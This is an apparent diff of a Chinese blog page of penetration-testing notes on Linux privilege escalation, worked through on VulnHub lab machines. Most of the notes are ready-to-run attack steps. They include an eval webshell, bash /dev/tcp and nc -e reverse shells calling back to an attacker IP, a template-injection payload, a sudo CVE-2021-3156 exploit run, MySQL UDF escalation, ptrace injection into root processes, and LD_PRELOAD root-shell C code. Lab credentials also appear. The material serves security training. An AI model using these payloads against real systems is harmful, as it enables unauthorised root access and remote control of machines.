+<h4 id="Web-用户-Sudo-cve-用户是因为git这种项目部署的时候需要普通用户权限支持"><a href="#Web-用户-Sudo-cve-用户是因为git这种项目部署的时候需要普通用户权限支持" class="headerlink" title="Web&amp;用户-Sudo(cve)&#x2F;&#x2F;用户是因为git这种项目部署的时候需要普通用户权限支持"></a>Web&amp;用户-Sudo(cve)&#x2F;&#x2F;用户是因为git这种项目部署的时候需要普通用户权限支持</h4><p>1、SUDO</p>
+<p>环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p>
+<p>搭建：创建任意虚拟机，然后将toppo.vmdx文件改名并替换原来的vmdx文件</p>
+<p>SUDO:</p>
+<p>cat &#x2F;etc&#x2F;sudoers</p>
+<p>&#x2F;usr&#x2F;bin&#x2F;awk ‘BEGIN {system(“&#x2F;bin&#x2F;sh”)}’    &#x2F;&#x2F;利用sudoers里面的awk去新开一个root权限的sh</p>
+<p>2、SUDO-CVE</p>
+<p>环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/devguru-1,620/">https://www.vulnhub.com/entry/devguru-1,620/</a></p>
+<p>-信息收集：</p>
+<p>80，8585</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.150/.git/">http://192.168.139.150/.git/</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.150/adminer.php">http://192.168.139.150/adminer.php</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.150/backend/backend/auth">http://192.168.139.150/backend/backend/auth</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.150:8585/">http://192.168.139.150:8585/</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.150:8585/admin">http://192.168.139.150:8585/admin</a></p>
+<p>-git泄漏(利用点)</p>
+<p>python GitHack.py <a target="_blank" rel="noopener" href="http://192.168.139.150/.git/">http://192.168.139.150/.git/</a></p>
+<p>-访问管理（Web入口）：</p>
+<p>adminer.php 添加用户名密码 登录后台 模版 写入Shell</p>
+<p>function onStart(){</p>
+<p>&#x2F;&#x2F;蚁剑连接</p>
+<p>eval($_POST[“pass”]);</p>
+<p>}</p>
+<p>-找备份寻突破（升权）：</p>
+<p>&#x2F;var&#x2F;backup&#x2F;app.ini.bak 修改用户密码 登录后台 写入反弹</p>
+<p>bash -c “exec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.139.141&#x2F;5555 0&gt;&amp;1” </p>
+<p>-利用sudo提权（cve）：</p>
+<p>sudo -l</p>
+<p>sudo -u#-1 sqlite3 &#x2F;dev&#x2F;null ‘.shell &#x2F;bin&#x2F;sh’</p>
+<p>git源码泄露 &#x3D;&gt; 找到数据库密码，登入 &#x3D;&gt; 找到cms后台用户密码，改为已知密码 &#x3D;&gt; 登入cms后台，写shell（低权限）</p>
+<p>gitea数据库配置备份文件泄露 &#x3D;&gt; 连接gitea数据库，找到gitea的用户密码 &#x3D;&gt; 登入gitea，写shell（更高权限） &#x3D;&gt; 提权。</p>
+<p>3、SUDO-CVE</p>
+<p>环境：kali2020</p>
+<p>sudo: 1.8.2 - 1.8.31p2</p>
+<p>sudo: 1.9.0 - 1.9.5p1</p>
+<p>-判断：sudoedit -s &#x2F; 报错存在</p>
+<p>-利用：</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156.git</a></p>
+<p>cd CVE-2021-3156</p>
+<p>make</p>
+<p>chmod a+x sudo-hax-me-a-sandwich</p>
+<p>.&#x2F;sudo-hax-me-a-sandwich 0</p>
+<h3 id="Web-用户-UDF提权-数据库类型"><a href="#Web-用户-UDF提权-数据库类型" class="headerlink" title="Web&amp;用户-UDF提权&#x2F;&#x2F;数据库类型"></a>Web&amp;用户-UDF提权&#x2F;&#x2F;数据库类型</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a></p>
+<p>1、信息收集：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.155/vendor/">http://192.168.139.155/vendor/</a></p>
+<p>2、Web权限获取：</p>
+<p>searchsploit phpmailer &#x2F;&#x2F;kali漏洞库查找，查找完之后后面会跟利用文件或者利用方法，40969就是利用脚本</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/25663185/1724895498697-cd063987-ddd5-406d-b77e-8da84acca8f7.png"></p>
-<p><font style="color:#000000;">find &#x2F; -name 40969.py   &#x2F;&#x2F;修改脚本相关的ip地址和后门路径</font></p>
-<p><font style="color:#000000;">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;40969.py p.py</font></p>
-<p><font style="color:#000000;">python p.py</font></p>
-<p><font style="color:#000000;">拿到web权限</font></p>
-<p><font style="color:#000000;">3、MYSQL-UDF提权：</font></p>
+<p>find &#x2F; -name 40969.py   &#x2F;&#x2F;修改脚本相关的ip地址和后门路径</p>
+<p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;40969.py p.py</p>
+<p>python p.py</p>
+<p>拿到web权限</p>
+<p>3、MYSQL-UDF提权：</p>
 <p>前提：需要数据库高权限</p>
-<p><font style="color:#000000;">-编译UDF.so</font></p>
-<p><font style="color:#000000;">searchsploit udf</font><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;">cp &#x2F;usr&#x2F;sha</font><font style="color:#000000;"></font><font style="color:#000000;">re&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;1518.c . #复制到当前所在文件夹</font></p>
-<p><font style="color:#000000;">gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc</font></p>
-<p><font style="color:#000000;">python -m http.server 8080    攻击机起一个py服务器让对方去下载   </font></p>
-<p><font style="color:#000000;">-下载到目标上</font></p>
-<p><font style="color:#000000;">python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</font></p>
-<p><font style="color:#000000;">cd tmp</font></p>
-<p><font style="color:#000000;">wget <a target="_blank" rel="noopener" href="http://192.168.139.141:8080/udf.so">http://192.168.139.141:8080/udf.so</a>	</font></p>
-<p><font style="color:#000000;">-连接进行导出调用</font></p>
-<p><font style="color:#000000;">mysql -uroot -pR@v3nSecurity   &#x2F;&#x2F;翻配置文件翻出来的</font></p>
-<p><font style="color:#000000;">select version(); #查看mysql版本</font></p>
-<p><font style="color:#000000;">select @@basedir; #确认mysql安装位置</font></p>
-<p><font style="color:#000000;">show variables like ‘%basedir%’; #确认mysql安装位置</font></p>
-<p><font style="color:#000000;">show variables like ‘%secure%’; #查看可导出文件位置。 &#x2F;&#x2F;看一下secure_file_priv是否关闭，如果开启写入文件后受限制，需要关闭状态</font></p>
-<p><font style="color:#000000;">show variables like ‘%plugin%’; #查找插件位置 &#x2F;&#x2F;一会把udf.so提权文件放到这边</font></p>
-<p><font style="color:#000000;">show variables like ‘%compile%’; #查看系统版本</font></p>
-<p><font style="color:#000000;">use mysql;</font></p>
-<p><font style="color:#000000;"># 创建xiaodi表</font></p>
-<p><font style="color:#000000;">create table xiaodi(line blob);</font></p>
-<p><font style="color:#000000;"># 往xiaodi表中插入二进制的udf.so</font></p>
-<p><font style="color:#000000;">insert into xiaodi values(load_file(‘&#x2F;tmp&#x2F;udf.so’));</font></p>
-<p><font style="color:#000000;"># 导出udf.so</font></p>
-<p><font style="color:#000000;">select * from xiaodi into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so’;	&#x2F;&#x2F;这里不直接下载到plugin目录下是因为web wget通常只能下载到tmp目录下，其他目录大概率没权限 ，在此之前记得chmod加执行权限</font></p>
-<p><font style="color:#000000;"># 创建do_system自定义函数</font></p>
-<p><font style="color:#000000;">create function do_system returns integer soname ‘udf.so’;</font></p>
-<p><font style="color:#000000;">select do_system(‘nc 192.168.139.141 6666 -e &#x2F;bin&#x2F;bash’);</font></p>
-<h3 id="Web-用户-Capability能力-理解为SUID升级版"><a href="#Web-用户-Capability能力-理解为SUID升级版" class="headerlink" title="Web&amp;用户-Capability能力 &#x2F;&#x2F;理解为SUID升级版"></a><font style="color:#000000;">Web&amp;用户-Capability能力 &#x2F;&#x2F;理解为SUID升级版</font></h3><p><font style="color:#000000;">原理参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/16026088.html">https://www.cnblogs.com/f-carey/p/16026088.html</a></font></p>
-<p><font style="color:#000000;">cp &#x2F;usr&#x2F;bin&#x2F;php &#x2F;tmp&#x2F;php</font></p>
-<p><font style="color:#000000;">设置能力：setcap cap_setuid+ep &#x2F;tmp&#x2F;php	&#x2F;&#x2F;让&#x2F;tmp&#x2F;php有suid权限</font></p>
-<p><font style="color:#000000;">删除能力：setcap -r &#x2F;tmp&#x2F;php</font></p>
-<p><font style="color:#000000;">查看单个能力：getcap &#x2F;usr&#x2F;bin&#x2F;php</font></p>
-<p><font style="color:#000000;">查看所有能力：getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</font></p>
+<p>-编译UDF.so</p>
+<p>searchsploit udf</p>
+<p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;1518.c . #复制到当前所在文件夹</p>
+<p>gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc</p>
+<p>python -m http.server 8080    攻击机起一个py服务器让对方去下载   </p>
+<p>-下载到目标上</p>
+<p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<p>cd tmp</p>
+<p>wget <a target="_blank" rel="noopener" href="http://192.168.139.141:8080/udf.so">http://192.168.139.141:8080/udf.so</a>	</p>
+<p>-连接进行导出调用</p>
+<p>mysql -uroot -pR@v3nSecurity   &#x2F;&#x2F;翻配置文件翻出来的</p>
+<p>select version(); #查看mysql版本</p>
+<p>select @@basedir; #确认mysql安装位置</p>
+<p>show variables like ‘%basedir%’; #确认mysql安装位置</p>
+<p>show variables like ‘%secure%’; #查看可导出文件位置。 &#x2F;&#x2F;看一下secure_file_priv是否关闭，如果开启写入文件后受限制，需要关闭状态</p>
+<p>show variables like ‘%plugin%’; #查找插件位置 &#x2F;&#x2F;一会把udf.so提权文件放到这边</p>
+<p>show variables like ‘%compile%’; #查看系统版本</p>
+<p>use mysql;</p>
+<h1 id="创建xiaodi表"><a href="#创建xiaodi表" class="headerlink" title="创建xiaodi表"></a>创建xiaodi表</h1><p>create table xiaodi(line blob);</p>
+<h1 id="往xiaodi表中插入二进制的udf-so"><a href="#往xiaodi表中插入二进制的udf-so" class="headerlink" title="往xiaodi表中插入二进制的udf.so"></a>往xiaodi表中插入二进制的udf.so</h1><p>insert into xiaodi values(load_file(‘&#x2F;tmp&#x2F;udf.so’));</p>
+<h1 id="导出udf-so"><a href="#导出udf-so" class="headerlink" title="导出udf.so"></a>导出udf.so</h1><p>select * from xiaodi into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so’;	&#x2F;&#x2F;这里不直接下载到plugin目录下是因为web wget通常只能下载到tmp目录下，其他目录大概率没权限 ，在此之前记得chmod加执行权限</p>
+<h1 id="创建do-system自定义函数"><a href="#创建do-system自定义函数" class="headerlink" title="创建do_system自定义函数"></a>创建do_system自定义函数</h1><p>create function do_system returns integer soname ‘udf.so’;</p>
+<p>select do_system(‘nc 192.168.139.141 6666 -e &#x2F;bin&#x2F;bash’);</p>
+<h3 id="Web-用户-Capability能力-理解为SUID升级版"><a href="#Web-用户-Capability能力-理解为SUID升级版" class="headerlink" title="Web&amp;用户-Capability能力 &#x2F;&#x2F;理解为SUID升级版"></a>Web&amp;用户-Capability能力 &#x2F;&#x2F;理解为SUID升级版</h3><p>原理参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/16026088.html">https://www.cnblogs.com/f-carey/p/16026088.html</a></p>
+<p>cp &#x2F;usr&#x2F;bin&#x2F;php &#x2F;tmp&#x2F;php</p>
+<p>设置能力：setcap cap_setuid+ep &#x2F;tmp&#x2F;php	&#x2F;&#x2F;让&#x2F;tmp&#x2F;php有suid权限</p>
+<p>删除能力：setcap -r &#x2F;tmp&#x2F;php</p>
+<p>查看单个能力：getcap &#x2F;usr&#x2F;bin&#x2F;php</p>
+<p>查看所有能力：getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/25663185/1724900446933-af6cfad0-a91a-4118-a2d7-390fc012bda9.png"></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/25663185/1724901611974-a20e2fea-6dac-46f3-8a0e-4654bd69e5a2.png"></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/25663185/1724901632225-67d2ff77-6a66-48aa-b8e2-50d5f9235252.png"></p>
 <p>.&#x2F;tmp&#x2F;php -r “posix_setuid(0); system(‘&#x2F;bin&#x2F;sh’);”</p>
-<p><font style="color:#000000;">Hacker_Kid</font></p>
-<p><font style="color:#000000;">WP参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/60673ac0454f">https://www.jianshu.com/p/60673ac0454f</a>	里面包含查看能力的解释</font></p>
-<p><font style="color:#000000;">环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacker-kid-101,719/">https://www.vulnhub.com/entry/hacker-kid-101,719/</a></font></p>
-<p><font style="color:#000000;">web入口点：账号密码</font></p>
-<p><font style="color:#000000;">saket</font></p>
-<p><font style="color:#000000;">Saket!#$%@!!</font></p>
-<p><font style="color:#000000;">{% import os %}{{os.system('bash -c "bash -i &> /dev/tcp/192.168.139.141/6688 0>&1"')}}</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.156:9999/?name=%7B%25+import+os+%25%7D%7B%7Bos.system(%27bash+-c+%22bash+-i+&%3E+/dev/tcp/192.168.139.141/6688+0%3E&1%22%27)%7D%7D">http://192.168.139.156:9999/?name=%7B%25+import+os+%25%7D%7B%7Bos%2Esystem%28%27bash+%2Dc+%22bash+%2Di+%26%3E+%2Fdev%2Ftcp%2F192%2E168%2E139%2E141%2F6688+0%3E%261%22%27%29%7D%7D</a></font></p>
-<p><font style="color:rgb(64, 64, 64);">python2.7拥有cap_sys_ptrace权限，意味着他可以调试别的进程</font></p>
-<p><font style="color:#000000;">&#x2F;sbin&#x2F;getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</font></p>
-<p><font style="color:#000000;">python -m http.server 8080</font></p>
-<p><font style="color:#000000;">wget <a target="_blank" rel="noopener" href="http://192.168.139.141:8080/inject.py">http://192.168.139.141:8080/inject.py</a></font></p>
-<p><font style="color:#000000;">for i in <code>ps -ef|grep root|grep -v &quot;grep&quot;|awk &#39;&#123;print $2&#125;&#39;</code>; do python2.7 inject.py $i; done	&#x2F;&#x2F;注入所有root权限进程</font></p>
-<p><font style="color:#000000;">nc 192.168.139.156 5600</font></p>
-<p><font style="color:#000000;">结论：suid升级版，更细致的权限划分，通过能力有哪些权限设置进行利用</font></p>
-<h3 id="普通用户-LD-Preload加载"><a href="#普通用户-LD-Preload加载" class="headerlink" title="普通用户-LD_Preload加载"></a><font style="color:#000000;">普通用户-LD_Preload加载</font></h3><p><font style="color:#000000;">&#x2F;&#x2F;只不过linux中特有的，是程序运行前就把要加载的程序包括了，这个LD_Preload是让程序需要的时候再加载，和dll提权差不多，当sudo提权查找到的是第三方文件的时候适用</font></p>
-<p><font style="color:#000000;">参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/10503985.html">https://www.cnblogs.com/backlion/p/10503985.html</a></font></p>
-<p><font style="color:#000000;">修改&#x2F;etc&#x2F;sudoers</font></p>
-<p><font style="color:#000000;">Defaults env_keep +&#x3D; LD_PRELOAD	&#x2F;&#x2F;允许程序启用</font></p>
-<p><font style="color:#000000;">test ALL&#x3D;(ALL:ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find	&#x2F;&#x2F;给test用户在运行find命令时所有的运行权限，不需要输入密码确定</font></p>
+<p>Hacker_Kid</p>
+<p>WP参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/60673ac0454f">https://www.jianshu.com/p/60673ac0454f</a>	里面包含查看能力的解释</p>
+<p>环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacker-kid-101,719/">https://www.vulnhub.com/entry/hacker-kid-101,719/</a></p>
+<p>web入口点：账号密码</p>
+<p>saket</p>
+<p>Saket!#$%@!!</p>
+{% import os %}{{os.system('bash -c "bash -i &> /dev/tcp/192.168.139.141/6688 0>&1"')}}
+
+<p><a target="_blank" rel="noopener" href="http://192.168.139.156:9999/?name=%7B%25+import+os+%25%7D%7B%7Bos.system(%27bash+-c+%22bash+-i+&%3E+/dev/tcp/192.168.139.141/6688+0%3E&1%22%27)%7D%7D">http://192.168.139.156:9999/?name=%7B%25+import+os+%25%7D%7B%7Bos%2Esystem%28%27bash+%2Dc+%22bash+%2Di+%26%3E+%2Fdev%2Ftcp%2F192%2E168%2E139%2E141%2F6688+0%3E%261%22%27%29%7D%7D</a></p>
+<p>python2.7拥有cap_sys_ptrace权限，意味着他可以调试别的进程</p>
+<p>&#x2F;sbin&#x2F;getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</p>
+<p>python -m http.server 8080</p>
+<p>wget <a target="_blank" rel="noopener" href="http://192.168.139.141:8080/inject.py">http://192.168.139.141:8080/inject.py</a></p>
+<p>for i in <code>ps -ef|grep root|grep -v &quot;grep&quot;|awk &#39;&#123;print $2&#125;&#39;</code>; do python2.7 inject.py $i; done	&#x2F;&#x2F;注入所有root权限进程</p>
+<p>nc 192.168.139.156 5600</p>
+<p>结论：suid升级版，更细致的权限划分，通过能力有哪些权限设置进行利用</p>
+<h3 id="普通用户-LD-Preload加载"><a href="#普通用户-LD-Preload加载" class="headerlink" title="普通用户-LD_Preload加载"></a>普通用户-LD_Preload加载</h3><p>&#x2F;&#x2F;只不过linux中特有的，是程序运行前就把要加载的程序包括了，这个LD_Preload是让程序需要的时候再加载，和dll提权差不多，当sudo提权查找到的是第三方文件的时候适用</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/10503985.html">https://www.cnblogs.com/backlion/p/10503985.html</a></p>
+<p>修改&#x2F;etc&#x2F;sudoers</p>
+<p>Defaults env_keep +&#x3D; LD_PRELOAD	&#x2F;&#x2F;允许程序启用</p>
+<p>test ALL&#x3D;(ALL:ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find	&#x2F;&#x2F;给test用户在运行find命令时所有的运行权限，不需要输入密码确定</p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span></span></span><br><span class="line"><span class="section">#include <span class="language-xml">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">stdlib.h</span>&gt;</span></span></span></span><br><span class="line">void <span class="emphasis">_init() &#123;</span></span><br><span class="line"><span class="emphasis">unsetenv(&quot;LD_</span>PRELOAD&quot;);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:#000000;">gcc -fPIC -shared -o shell.so shell.c -nostartfiles	&#x2F;&#x2F;自己写一个加载文件</font></p>
-<p><font style="color:#000000;">ls -al shell.so</font></p>
-<p><font style="color:#000000;">sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;shell.so find	&#x2F;&#x2F;在sudo运行find是加载写入的加载文件</font></p>
-<p><font style="color:#000000;">whoami</font></p>
-<p><font style="color:#000000;">Defaults env_keep +&#x3D; LD_PRELOAD</font></p>
-<p><font style="color:#000000;">test ALL&#x3D;(ALL:ALL) NOPASSWD: &#x2F;tmp&#x2F;LinEnum.sh</font></p>
-<p><font style="color:#000000;">sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;shell.so &#x2F;tmp&#x2F;LinEnum.sh</font></p>
-<p><font style="color:#000000;">结论：sudo提权有限制，如果sudo里面第三方文件就得二进制分析，难度较大，但是一旦设置了LD_PRELOAD，那么只要有程序既可提权</font></p>
-<h2 id="普通用户-Rbash绕过"><a href="#普通用户-Rbash绕过" class="headerlink" title="普通用户-Rbash绕过"></a><font style="color:#000000;">普通用户-Rbash绕过</font></h2><p>会给rbash用户组下面非常低的权限，rbash是linux限制用户权限的技术</p>
-<p><font style="color:#000000;">参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7642">https://xz.aliyun.com/t/7642</a></font></p>
-<p><font style="color:#000000;">Rbash(The Restricted mode of bash),也就是限制型bash</font></p>
-<p><font style="color:#000000;">在渗透测试中可能遇到rbash，尝试绕过后才能进行后续操作</font></p>
-<p><font style="color:#000000;">sudoadduser xiaodisec</font></p>
-<p><font style="color:#000000;">sudo usermod -s &#x2F;bin&#x2F;rbash xiaodisec</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/funbox-rookie,520/">https://www.vulnhub.com/entry/funbox-rookie,520/</a></font></p>
-<p><font style="color:#000000;">1、入口点：</font></p>
-<p><font style="color:#000000;">fscan -h 192.168.1.0&#x2F;24</font></p>
-<p><font style="color:#000000;">ftp 192.168.1.8</font></p>
-<p><font style="color:#000000;">get tom.zip(iubire)</font></p>
-<p><font style="color:#000000;">ssh <a href="mailto:&#116;&#x6f;&#x6d;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#46;&#56;">&#116;&#x6f;&#x6d;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#46;&#56;</a> -i id_rsa</font></p>
-<p><font style="color:#000000;">2、Rbash绕过：</font></p>
-<p><font style="color:#000000;">python -m http.server 8080</font></p>
-<p><font style="color:#000000;">wget <a target="_blank" rel="noopener" href="http://192.168.1.3:8080/LinEnum.sh">http://192.168.1.3:8080/LinEnum.sh</a></font></p>
-<p><font style="color:#000000;">awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’	&#x2F;&#x2F;sudo</font></p>
-<p><font style="color:#000000;">3、历史泄漏提权：</font></p>
-<p><font style="color:#000000;">.&#x2F;LinEnum.sh</font></p>
-<p><font style="color:#000000;">cat &#x2F;home&#x2F;tom&#x2F;.mysql_history</font></p>
-<p><font style="color:#000000;">su root(xx11yy22!)</font></p>
+<p>gcc -fPIC -shared -o shell.so shell.c -nostartfiles	&#x2F;&#x2F;自己写一个加载文件</p>
+<p>ls -al shell.so</p>
+<p>sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;shell.so find	&#x2F;&#x2F;在sudo运行find是加载写入的加载文件</p>
+<p>whoami</p>
+<p>Defaults env_keep +&#x3D; LD_PRELOAD</p>
+<p>test ALL&#x3D;(ALL:ALL) NOPASSWD: &#x2F;tmp&#x2F;LinEnum.sh</p>
+<p>sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;shell.so &#x2F;tmp&#x2F;LinEnum.sh</p>
+<p>结论：sudo提权有限制，如果sudo里面第三方文件就得二进制分析，难度较大，但是一旦设置了LD_PRELOAD，那么只要有程序既可提权</p>
+<h2 id="普通用户-Rbash绕过"><a href="#普通用户-Rbash绕过" class="headerlink" title="普通用户-Rbash绕过"></a>普通用户-Rbash绕过</h2><p>会给rbash用户组下面非常低的权限，rbash是linux限制用户权限的技术</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7642">https://xz.aliyun.com/t/7642</a></p>
+<p>Rbash(The Restricted mode of bash),也就是限制型bash</p>
+<p>在渗透测试中可能遇到rbash，尝试绕过后才能进行后续操作</p>
+<p>sudoadduser xiaodisec</p>
+<p>sudo usermod -s &#x2F;bin&#x2F;rbash xiaodisec</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/funbox-rookie,520/">https://www.vulnhub.com/entry/funbox-rookie,520/</a></p>
+<p>1、入口点：</p>
+<p>fscan -h 192.168.1.0&#x2F;24</p>
+<p>ftp 192.168.1.8</p>
+<p>get tom.zip(iubire)</p>
+<p>ssh <a href="mailto:&#x74;&#111;&#x6d;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#46;&#56;">&#x74;&#111;&#x6d;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#46;&#56;</a> -i id_rsa</p>
+<p>2、Rbash绕过：</p>
+<p>python -m http.server 8080</p>
+<p>wget <a target="_blank" rel="noopener" href="http://192.168.1.3:8080/LinEnum.sh">http://192.168.1.3:8080/LinEnum.sh</a></p>
+<p>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’	&#x2F;&#x2F;sudo</p>
+<p>3、历史泄漏提权：</p>
+<p>.&#x2F;LinEnum.sh</p>
+<p>cat &#x2F;home&#x2F;tom&#x2F;.mysql_history</p>
+<p>su root(xx11yy22!)</p>
 
   </div>
 </article>
@@ -573,7 +567,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux"><span class="toc-number">1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%AD%9B%E9%80%89%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">内核漏洞筛选：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-linux%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">web-linux应用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">常见内核漏洞案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-Dcow"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Web&amp;内核溢出-Dcow</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-Pwnkit"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">Web&amp;内核溢出-Pwnkit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-DirtyPipe"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">Web&amp;内核溢出-DirtyPipe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">补充</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-NFS%E5%AE%89%E5%85%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">Web&amp;用户-NFS安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Cron%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.3.</span> <span class="toc-text">Web&amp;用户-Cron任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-Web-%E7%94%A8%E6%88%B7-PATH%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.4.</span> <span class="toc-text">Linux系统提权-Web&amp;用户-PATH变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-SUDO%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">1.3.5.</span> <span class="toc-text">SUID&amp;SUDO应用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Suid"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">Web&amp;用户-Suid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Sudo-cve-%E7%94%A8%E6%88%B7%E6%98%AF%E5%9B%A0%E4%B8%BAgit%E8%BF%99%E7%A7%8D%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E9%9C%80%E8%A6%81%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%94%AF%E6%8C%81"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">Web&amp;用户-Sudo(cve)&#x2F;&#x2F;用户是因为git这种项目部署的时候需要普通用户权限支持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 